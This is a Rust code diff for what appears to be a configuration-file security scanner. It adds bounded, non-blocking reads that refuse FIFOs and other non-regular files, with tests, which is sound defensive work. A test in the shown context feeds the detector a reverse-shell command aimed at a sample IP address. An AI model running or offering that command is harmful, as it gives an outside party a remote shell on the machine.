@@ -214,20 +214,51 @@ pub fn read_text_files(dir: &Path) -> Vec<(PathBuf, String)> {
         .into_iter()
         .filter_map(|e| e.ok())
         .filter(|e| e.path().is_file())
-        .filter_map(|e| {
-            fs::read_to_string(e.path())
-                .ok()
-                .map(|contents| (e.path().to_path_buf(), contents))
-        })
+        .filter_map(|e| read_text_file(e.path()).map(|contents| (e.path().to_path_buf(), contents)))
         .collect();
 
     files.sort_by(|a, b| a.0.cmp(&b.0));
     files
 }
 
+/// Largest prefix of a file the scanners will read. Config files are tiny; an
+/// attacker-planted multi-gigabyte file must not exhaust memory.
+pub const MAX_SCAN_READ: u64 = 16 * 1024 * 1024;
+
+/// Open `path` without blocking and return it with its metadata.
+///
+/// `O_NONBLOCK` matters for FIFOs: a plain `open` on a named pipe blocks until
+/// a writer appears, which an attacker can arrange never to happen, hanging
+/// the scan forever. Symlinks are followed, as config paths often are links.
+pub fn open_nonblocking(path: &Path) -> std::io::Result<(fs::File, fs::Metadata)> {
+    use std::os::unix::fs::OpenOptionsExt;
+    let file = fs::OpenOptions::new()
+        .read(true)
+        .custom_flags(libc::O_NONBLOCK)
+        .open(path)?;
+    let meta = file.metadata()?;
+    Ok((file, meta))
+}
+
+/// Read at most `max` bytes of `path`, refusing anything but a regular file
+/// (FIFOs, sockets, devices and directories are errors).
+pub fn read_regular_file(path: &Path, max: u64) -> std::io::Result<Vec<u8>> {
+    use std::io::Read;
+    let (file, meta) = open_nonblocking(path)?;
+    if !meta.file_type().is_file() {
+        return Err(std::io::Error::new(
+            std::io::ErrorKind::InvalidInput,
+            format!("{} is not a regular file", path.display()),
+        ));
+    }
+    let mut buf = Vec::with_capacity(meta.len().min(max) as usize);
+    file.take(max).read_to_end(&mut buf)?;
+    Ok(buf)
+}
+
 /// Read a single file as text, treating "missing" and "unreadable" alike.
 pub fn read_text_file(path: &Path) -> Option<String> {
-    fs::read_to_string(path).ok()
+    String::from_utf8(read_regular_file(path, MAX_SCAN_READ).ok()?).ok()
 }
 
 #[cfg(test)]
@@ -258,6 +289,27 @@ mod tests {
         assert!(has_strong_reason(&suspicious_matches(
             "bash -i >& /dev/tcp/1.2.3.4/9 0>&1"
         )));
+    }
+
+    #[test]
+    fn fifos_and_directories_are_refused_without_blocking() {
+        let dir = tempfile::TempDir::new().unwrap();
+        let fifo = dir.path().join(".hidden_pipe");
+        let c = std::ffi::CString::new(fifo.to_str().unwrap()).unwrap();
+        // SAFETY: valid NUL-terminated path, plain mkfifo call.
+        assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);
+        // Would hang forever with a blocking open and no writer.
+        assert!(read_regular_file(&fifo, 1024).is_err());
+        assert!(read_text_file(&fifo).is_none());
+        assert!(read_regular_file(dir.path(), 1024).is_err());
+    }
+
+    #[test]
+    fn reads_are_capped() {
+        let dir = tempfile::TempDir::new().unwrap();
+        let big = dir.path().join("big");
+        fs::write(&big, vec![b'a'; 4096]).unwrap();
+        assert_eq!(read_regular_file(&big, 100).unwrap().len(), 100);
     }
 
     #[test]
